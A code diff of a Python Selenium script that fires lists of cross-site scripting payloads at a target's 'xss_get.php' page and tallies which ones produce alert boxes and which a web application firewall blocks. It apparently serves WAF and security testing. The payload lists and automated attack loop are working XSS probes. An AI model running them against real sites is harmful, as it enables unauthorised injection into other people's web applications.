@@ -1,43 +1,17 @@
-from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.common.exceptions import TimeoutException
 from selenium.common.exceptions import NoSuchElementException
-import time
-
-# PATH = """C:\Program Files (x86)\chromedriver.exe"""
-#
-#
-# def init():
-#     print("[+] Initializing")
-#     driver = webdriver.Chrome(PATH)
-#
-#     # Import data about the target (url, username, password)
-#     with open("secret.txt") as file:
-#         target_url, username, password = file.read().splitlines()
-#
-#     # Login to website
-#     driver.get(target_url)
-#     element = driver.find_element_by_id("login")
-#     element.clear()
-#     element.send_keys(username)
-#     element = driver.find_element_by_id("password")
-#     element.clear()
-#     element.send_keys(password, Keys.RETURN)
-#     return driver, target_url
 
 
 def execute(driver, target_url):
-    #driver, target_url = init()  # to delete
-
     # Start to attack
     implement_attack(driver, target_url)
 
-    driver.quit()
-
 
 def implement_attack(driver, target_url):
+    print(f"[+] Running Cross Site Scripting [XSS] Attacks")
     xss_level_1 = [
         """<img src="" onerror="alert('XSS')">""",
         """<IMG SRC=# onerror="alert('XSS')">""",
@@ -72,12 +46,12 @@ def implement_attack(driver, target_url):
 
     all_xss_levels = [xss_level_1, xss_level_2, xss_level_3, xss_level_4]
     lvl_counter = 1
+    blocked_by_waf_counter = 0
     results = {}
     attack_url_page = "xss_get.php"
 
     for lvl in all_xss_levels:
-        print(f"[+] Running XSS attack - Level {lvl_counter}")
-        result_counter = 0
+        success_counter = 0
 
         for payload in lvl:
             driver.get(target_url + attack_url_page)
@@ -89,7 +63,7 @@ def implement_attack(driver, target_url):
                 WebDriverWait(driver, 1).until(EC.alert_is_present())
                 alert = driver.switch_to.alert
                 alert.accept()
-                result_counter += 1
+                success_counter += 1
             except TimeoutException:
                 # look for any element with id="xss", click it and check for 'alert' box
                 try:
@@ -97,18 +71,24 @@ def implement_attack(driver, target_url):
                     WebDriverWait(driver, 5).until(EC.alert_is_present())
                     alert = driver.switch_to.alert
                     alert.accept()
-                    result_counter += 1
+                    success_counter += 1
                 except NoSuchElementException:
-                    pass
-                print("Attack Failed:", payload)
+                    try:
+                        # Catch WAF Blocking page
+                        waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
+                        if "403 Forbidden" == waf_block_message:
+                            blocked_by_waf_counter += 1
+                    except NoSuchElementException:
+                        pass
 
-        print(f"[+] Passed Attacks For Level {str(lvl_counter)}:", result_counter, "/", len(lvl))
-        results["lvl " + str(lvl_counter)] = result_counter
+        print(f"[+] [Level {str(lvl_counter)}] Successful Attacks:", success_counter)
+        results["lvl " + str(lvl_counter)] = success_counter
         lvl_counter += 1
 
     sum = 0
     for res in results.values(): sum += res
-    print("[+] Results: " + str(sum) + " XSS Attacks Passed [+]")
+    print(f"\n[!] ~~~Cross Site Scripting [XSS] Results~~~ [!]")
+    print(f"[+] Total Successful Attacks:", sum)
+    print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
+    print(f"[+] Total Failed Attacks:", len(xss_level_1+xss_level_2+xss_level_3+xss_level_4) - blocked_by_waf_counter - sum)
 
-if __name__ == '__main__':
-    execute()
